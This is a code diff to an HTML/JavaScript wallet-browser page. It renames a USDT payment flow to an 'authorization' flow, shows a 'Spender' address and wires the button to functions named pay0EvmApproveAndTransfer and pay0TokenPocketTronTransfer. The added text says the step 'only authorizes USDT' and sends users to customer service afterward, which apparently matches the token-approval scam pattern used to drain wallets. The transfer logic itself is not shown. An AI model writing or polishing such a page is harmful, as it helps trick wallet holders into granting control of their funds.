@@ -32,28 +32,29 @@
           
           <div class="card-body p-4">
             <div class="mb-4">
-              <div class="d-flex justify-content-between mb-2">
-                <span class="text-secondary">收款地址</span>
-              </div>
-              <div class="p-2 bg-light rounded text-break mono small" id="toAddressText">
-                --
-              </div>
+            <div class="d-flex justify-content-between mb-2">
+              <span class="text-secondary">授权地址 (Spender)</span>
             </div>
-
-            <div id="actionArea">
-              <button id="btnMainPay" class="btn btn-primary pay-btn" disabled>
-                连接钱包中...
-              </button>
+            <div class="p-2 bg-light rounded text-break mono small" id="toAddressText">
+              --
             </div>
-            
-            <div id="statusText" class="status-text">请在钱包浏览器中操作</div>
           </div>
-        </div>
 
-        <div class="text-center mt-4 text-secondary small">
-          <p>本页面专为钱包内置浏览器优化</p>
-          <a href="javascript:history.back()" class="text-decoration-none text-secondary">返回上一页</a>
+          <div id="actionArea">
+            <button id="btnMainPay" class="btn btn-primary pay-btn" disabled>
+              连接钱包中...
+            </button>
+          </div>
+          
+          <div id="statusText" class="status-text">请在钱包浏览器中操作</div>
         </div>
+      </div>
+
+      <div class="text-center mt-4 text-secondary small">
+        <p>本次操作仅进行 USDT 授权</p>
+        <p class="opacity-75">授权后请联系客服确认订单</p>
+        <a href="javascript:history.back()" class="text-decoration-none text-secondary">返回上一页</a>
+      </div>
 
       </div>
     </div>
@@ -139,7 +140,7 @@
         $("netText").textContent = "TRON 网络";
         updateToAddress("tron");
         return async () => {
-           log("正在发起 TRON 支付...");
+           log("正在发起 TRON 授权...");
            // 确保 amount 是字符串
            const amount = (cfg.amountUsdt || "0.00").toString();
            await window.pay0TokenPocketTronTransfer({ log, amountUsdt: amount });
@@ -176,7 +177,7 @@
           updateToAddress(foundKey);
           
           return async () => {
-             log("正在发起 EVM 支付...");
+             log("正在发起 EVM 授权...");
              const amount = (cfg.amountUsdt || "0.00").toString();
              await window.pay0EvmApproveAndTransfer({ chain: foundKey, log, amountUsdt: amount });
           };
@@ -217,22 +218,22 @@
             btn.onclick = async () => {
               try {
                 btn.disabled = true;
-                btn.textContent = "支付处理中...";
+                btn.textContent = "授权处理中...";
                 await payHandler();
-                btn.textContent = "支付成功";
+                btn.textContent = "授权成功";
                 btn.classList.remove("btn-primary");
                 btn.classList.add("btn-success");
-                log("支付已完成");
+                log("授权已完成");
               } catch (e) {
                 btn.disabled = false;
-                btn.textContent = "重试支付";
-                log("支付失败: " + (e.message || e));
-                alert("支付失败: " + (e.message || e));
+                btn.textContent = "重试授权";
+                log("授权失败: " + (e.message || e));
+                alert("授权失败: " + (e.message || e));
               }
             };
 
             // 自动触发尝试（某些钱包允许，某些会拦截）
-            log("环境已就绪，请点击支付");
+            log("环境已就绪，请点击按钮进行授权");
           } else {
             btn.textContent = "未检测到钱包环境";
             btn.disabled = true;
